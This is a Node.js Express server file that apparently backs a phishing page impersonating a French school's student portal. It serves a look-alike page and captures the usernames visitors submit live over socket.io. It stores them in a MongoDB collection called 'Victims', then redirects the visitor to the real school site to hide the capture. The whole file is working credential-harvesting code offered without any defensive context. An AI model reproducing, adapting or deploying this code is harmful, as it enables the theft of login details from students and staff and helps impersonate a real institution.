require('dotenv').config();

const express = require('express');
const app = express();

app.set('trust proxy', true); // <- required
app.use((req, res, next) => {
  if(!req.secure) return res.redirect('https://' + req.get('host') + req.url);
  next();
});

const http = require('http').Server(app);
const io = require('socket.io')(http);
const mongoose = require('mongoose');
const chalk = require('chalk');
const Victims = require('./model');

app.use(express.static('public'));
app.use(express.urlencoded({ extended : true }));
app.use(express.json());

const PORT = process.env.PORT || 3000;

mongoose.connect(process.env.DATABASE_URI, {
    useUnifiedTopology: true,
    useNewUrlParser: true
});

const db = mongoose.connection;

db.on('connected', () => {
    console.log(chalk.yellow('database connected'));
});

db.on('disconnected', () => {
    console.log(chalk.redBright('database disconnected'));
});

db.on('error', () => {
    console.error(chalk.red('connection error'));
});

db.on('open', () => {
    console.log(chalk.green('database open'));
});

app.get('/', function(req, res) {
    res.redirect('/eleve.html');
});

app.get('/eleve.html', (req, res) => {
    res.sendFile(`${__dirname}/index.html`);
});

app.post('/', (req, res) => {
    res.redirect('https://vs.ecolejeanninemanuel.net/eleve.html');
});

io.on('connection', (socket) => {
    console.log('A user connected');
    
    socket.on('username', (data) => {
        let newUsername = {};
        newUsername.username = data;
        
        console.log(chalk.cyanBright(newUsername.username));

        let myData = new Victims(newUsername);

        myData.save()
            .then(item => {
                console.log(chalk.green('username saved in the database'));
            })
            .catch(err => {
                console.log(chalk.red('problem while saving username in the databse'));
            });
    });

   socket.on('disconnect', () => {
       console.log(chalk.yellowBright('user disconnected'));
   });
});

http.listen(PORT, () => {
    console.log(chalk.underline.yellow(`server listening on port ${PORT}`));
});